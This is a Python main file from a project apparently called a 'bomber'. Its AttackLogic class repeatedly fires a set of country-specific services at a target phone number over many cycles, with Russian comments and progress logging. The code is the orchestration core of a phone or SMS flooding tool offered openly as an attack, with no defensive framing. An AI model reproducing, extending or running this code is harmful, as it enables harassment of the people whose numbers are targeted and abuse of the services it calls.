###########################
####    v4yve corp.    ####
####  bomber by v4yve  ####
####   main.py - файл  ####
###########################

# Библиотеки
import asyncio
from datetime import datetime

from loguru import logger

from v4yve.app.status import status
from v4yve.service import prepare_services
from v4yve.utils import await_with_callback


# класстер AttackLogic
class AttackLogic:
    def __init__(
        self, attack_id: str, number_of_cycles: int, country_code: int, phone: str
    ):
        self.attack_id = attack_id
        self.number_of_cycles = number_of_cycles
        self.country_code = country_code
        self.phone = phone

    @logger.catch
    async def perform_attack(self):
        try:
            await self._perform_attack()
        except asyncio.CancelledError:
            pass

    async def _perform_attack(self):
        services = prepare_services()
        usable_services = services.get(self.country_code, services["other"])

        status[self.attack_id]["started_at"] = datetime.now().isoformat()
        status[self.attack_id]["end_at"] = len(usable_services) * self.number_of_cycles

        # Logger
        logger.info(f"[+] - [ID : {self.attack_id}] - [Номер +{self.phone}]")

        for cycle in range(self.number_of_cycles):
            logger.info(f"[{cycle + 1}] - [Номер +{self.attack_id}]")

            tasks = [
                await_with_callback(
                    service(self.phone, self.country_code).run(),
                    update_count,
                    attack_id=self.attack_id,
                )
                for service in usable_services
            ]

            for task in asyncio.as_completed(tasks):
                await task

        logger.success(f"[-] - [ID : {self.attack_id}] - [Номер +{self.phone}]")


@logger.catch
def update_count(attack_id: str):
    if status[attack_id]["currently_at"] is None:
        status[attack_id]["currently_at"] = 0
    status[attack_id]["currently_at"] += 1
